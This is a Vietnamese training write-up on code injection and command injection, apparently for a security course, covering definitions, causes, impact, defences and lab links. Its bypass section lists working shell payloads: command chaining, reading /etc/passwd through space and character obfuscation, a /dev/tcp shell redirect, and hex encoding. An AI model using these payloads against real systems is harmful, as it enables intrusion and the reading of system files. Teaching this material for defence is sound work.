```
Task 10:
+ Tìm hiểu về lỗ hổng code injection  và command injection.(Khái niệm , nguyên nhân, tác hại + 1 số cách bypass, cách phòng chống).
+ Nêu ra điểm khác nhau giữa hai lỗi.
+ Làm lab demo hai lỗi trên.
```

# Code Injection
### Khái niệm
Code Injection là loại tấn công mà kẻ tấn công có thể chèn mã độc vào ứng dụng. Khi đó, ứng dụng thực thi đoạn mã độc đó và gây ảnh hưởng đến người dùng, máy chủ.
### Nguyên nhân
Nguyên nhân chính của `code injection` là việc không kiểm tra đầu vào đúng cách, sử dụng các thư viện không an toàn hoặc không cập nhật, hay không sử dụng các biện pháp bảo vệ bảo mật như mã hóa dữ liệu. Ngoài ra còn do server có các chức năng hoặc  thực hiện các hàm nguy hiểm mà người dùng kiểm soát được như: `eval()`, `system()`,...
### Tác hại 
- Tác hại của `code injection` có thể rất nghiêm trọng. Kẻ tấn công có thể truy cập và thay đổi dữ liệu, lấy cắp thông tin nhạy cảm, thực hiện các hành động trái phép trên hệ thống máy chủ, thậm chí kiểm soát toàn bộ máy chủ.
- Ngoài ra còn có thể dẫn đến các cuộc tấn công khác như: SQL injection, XXS, Command injection, ...
### Bypass
- Sử dụng các ký tự để inject như: `;`, `|`, `&`, #`, ...
- Encode: URL, hex, ... để bypass backlist
### Cách phòng chống
- Hạn chế sử dụng các hàm có thể thực thi câu lệnh như: `system()`, `exec()`, `eval()`,...
- Xác thực đầu vào như sử dụng whitelist: chỉ cho phép các từ kiểm soát được.
- Mã hóa: escape HTML entities để hạn chế nguy cơ thành mã độc hoặc mã hóa dữ liệu bằng cách khác trước khi được lưu trữ hoặc chuyển lên internet.
- Sử dụng tường lửa, các công cụ phát hiện tấn công và thường xuyên cập nhật thư viện an toàn.
### Lab
<a href="https://github.com/caodchuong312/KCSC-Training/tree/main/task10/Code%20Injection%20Lab">lab</a>

# Commmand Injection
### Khái niệm
Command injection là lỗ hổng mà kẻ tấn công có thể thực thi câu lệnh hệ điều hành trên máy chủ của ứng dụng đó
### Nguyên nhân
Nguyên nhân chính của command injection là thiếu kiểm tra đầu vào của ứng dụng hoặc sử dụng các hàm không an toàn trong xử lý đầu vào như: `system()`, `eval()`, `exec()`, ...
Khi những lỗ hổng này xảy, kẻ tấn công có thể thực hiện các hành động trái phép nh như xem, sửa đổi hoặc xóa dữ liệu, kiểm soát toàn bộ hệ thống, và thực hiện các cuộc tấn công khác như DoS,...
### Tác hại
Tác hại của command injection rất nghiêm trọng. Kẻ tấn công có thể kiểm soát hoàn toàn hệ thống, đọc và sửa đổi các tập tin quan trọng, truy cập và thay đổi cơ sở dữ liệu, thực hiện các hành động trái phép trên mạng. Ngoài ra còn có thể dẫn đến các cuộc tấn công khác để đạt được mục đích kể tấn công.
### Bypass:
- Exploit: `; ls` `&& ls`, `| ls`, `|| ls`,...
- Bypass space:
  - Sử dụng `<`: `cat</etc/passwd`
  - Sử dụng `$IFS`: `cat$IFS/etc/passwd`
  - Hoặc dùng shell: `sh</dev/tcp/127.0.0.1/4242`
  - ...
- Bypass words:
  - quote: `w'h'o'am'i`, `w"h"o"am"i`
  - blackslash, slash: `w\ho\am\i`, `/\b\i\n/////s\h`
  - $@: `who$()ami`
  - $(): `who$()ami`
  - `/usr/bin/who*mi` => `/usr/bin/whoami`
  - `$0` => bash
- Bypass characters:
  - `${HOME:0:1}`, `. | tr '!-0' '"-1'`, `${PATH:0:1}` => `/`
  - `${LS_COLORS:10:1}` => `;`
- Encoding hex: `\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64`, `2f6574632f706173737764` => `/etc/passwd`
- RCE with 4 or 5 char: <a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#rce-with-5-chars">here</a>
### Phòng chống
- Kiểm tra xác thực đầu vào: Dùng whitelist để cho phép các câu lệnh an toàn được thực thi, loại bỏ các ký tự có thể chèn mã đọc như: `;`, `"`, `'`, `|`, `&`,...
- Chỉ chấp nhận đầu vào chỉ có ký tự chữ và số, không có ký tự đặc biệt, khoảng trắng, ...
- Ngoài ra cần thường xuyên cập nhật ứng dùng, thư viên an toàn.
### Lab
<a href="https://github.com/caodchuong312/KCSC-Training/tree/main/task10/CommandInjectionLab">lab</a>

  
## Khác nhau giữa Code injection và Command injection

- Code injection đề cập đến việc chèn 1 đoạn code độc hại và sẽ được thực thi trên ứng dụng đó. Khi ứng dụng chạy PHP thì sẽ chỉ chèn được code PHP hay với Nodejs thì là JavaScript,... Trong 1 số trường hợp thì lỗ hổng này thường chuyển sang lỗ hổng command injection.
- Command injection đề cập việc chèn 1 câu lệnh hệ thống trên máy chủ. Vì vậy câu lệnh tuy thuộc vào hệ điều hành máy chủ web hoặc là loại shell mà nó sử dụng. Lỗ hổng này cho kẻ tấn cống dễ dàng tấn công vào server hơn hoặc mở rộng chức năng của mặc định của ứng dụng, thực thi trực tiếp mà không cần chèn thêm code.
